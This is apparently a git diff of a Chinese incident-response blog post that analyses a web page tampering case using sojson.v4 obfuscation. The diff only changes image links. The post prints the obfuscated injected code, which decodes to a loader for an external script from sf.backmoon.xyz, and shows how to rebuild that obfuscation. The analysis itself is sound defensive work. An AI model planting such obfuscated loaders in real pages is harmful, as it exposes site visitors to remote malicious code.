@@ -23,7 +23,7 @@ tags: [红蓝对抗, 页面篡改]
 (((['sojson.v4']+[])["constructor"]['fromCharCode']['apply'](null,"100O111Z99q117F109p101j110V116Q46F119J114B105G116W101C108m110b40k34e60B115F99e114x105M112H116J32S115i114p99j61L92Q39H104c116D116R112Z58c47c47j115m102w46k98v97y99j107v109R111i111p110F46W120n121c122h47G106t115Y47r106g113P117Q101p114u121R46C109s105h110w46b112E104J112D92N39l62T60W47P115Z99Y114O105p112k116D62d34l41L59"['split'](/[a-zA-Z]{1,}/))))
 ```
 放在浏览器console中直接输出结果
-![](20200813124226.png)
+![](https://raw.githubusercontent.com/x7peeps/x7peeps-images/main/content/安全/应急响应/0x03取证分析/页面篡改分析/页面篡改分析-基于sojson.v4混淆的页面篡思路分析/20200813124226.png)
 
 ```
 document.writeln("<script src=\'http[:]//sf[.]backmoon[.]xyz/js/jquery.min.php\'></script>");
@@ -50,7 +50,7 @@ document.writeln("<script src=\'http[:]//sf[.]backmoon[.]xyz/js/jquery.min.php\'
 ```
 String.fromCharCode("100", "111", "99", "117", "109", "101", "110", "116", "46", "119", "114", "105", "116", "101", "108", "110", "40", "34", "60", "115", "99", "114", "105", "112", "116", "32", "115", "114", "99", "61", "92", "39", "104", "116", "116", "112", "58", "47", "47", "115", "102", "46", "98", "97", "99", "107", "109", "111", "111", "110", "46", "120", "121", "122", "47", "106", "115", "47", "106", "113", "117", "101", "114", "121", "46", "109", "105", "110", "46", "112", "104", "112", "92", "39", "62", "60", "47", "115", "99", "114", "105", "112", "116", "62", "34", "41", "59")
 ```
-![](20200814161526.png)
+![](https://raw.githubusercontent.com/x7peeps/x7peeps-images/main/content/安全/应急响应/0x03取证分析/页面篡改分析/页面篡改分析-基于sojson.v4混淆的页面篡思路分析/20200814161526.png)
 
 
 ## 还原加密过程：
@@ -59,7 +59,7 @@ String.fromCharCode("100", "111", "99", "117", "109", "101", "110", "116", "46",
 ```
 document.writeln("<script src=\'http://baidu.com\'></script>");
 ```
-[to charcode 10进制](https://gchq.github.io/CyberChef/#recipe=To_Charcode('Comma',10)Find_/_Replace(%7B'option':'Regex','string':','%7D,'A',true,true,true,true/disabled)&input=ZG9jdW1lbnQud3JpdGVsbigiPHNjcmlwdCBzcmM9XCdodHRwOi8vYmFpZHUuY29tXCc%2BPC9zY3JpcHQ%2BIik7)![](20200814165203.png)
+[to charcode 10进制](https://gchq.github.io/CyberChef/#recipe=To_Charcode('Comma',10)Find_/_Replace(%7B'option':'Regex','string':','%7D,'A',true,true,true,true/disabled)&input=ZG9jdW1lbnQud3JpdGVsbigiPHNjcmlwdCBzcmM9XCdodHRwOi8vYmFpZHUuY29tXCc%2BPC9zY3JpcHQ%2BIik7)![](https://raw.githubusercontent.com/x7peeps/x7peeps-images/main/content/安全/应急响应/0x03取证分析/页面篡改分析/页面篡改分析-基于sojson.v4混淆的页面篡思路分析/20200814165203.png)
 
 ```
 100,111,99,117,109,101,110,116,46,119,114,105,116,101,108,110,40,34,60,115,99,114,105,112,116,32,115,114,99,61,92,39,104,116,116,112,58,47,47,98,97,105,100,117,46,99,111,109,92,39,62,60,47,115,99,114,105,112,116,62,34,41,59
@@ -81,5 +81,5 @@ document.writeln("<script src=\'http://baidu.com\'></script>");
 ```
 (((['xxx随机']+[])["constructor"]['fromCharCode']['apply'](null,"100A111A99A117A109A101A110A116A46A119A114A105A116A101A108A110A40A34A60A115A99A114A105A112A116A32A115A114A99A61A92A39A104A116A116A112A58A47A47A98A97A105A100A117A46A99A111A109A92A39A62A60A47A115A99A114A105A112A116A62A34A41A59".split(/[a-zA-Z]{1,}/))))
 ```
-![](20200814165359.png)
+![](https://raw.githubusercontent.com/x7peeps/x7peeps-images/main/content/安全/应急响应/0x03取证分析/页面篡改分析/页面篡改分析-基于sojson.v4混淆的页面篡思路分析/20200814165359.png)
 
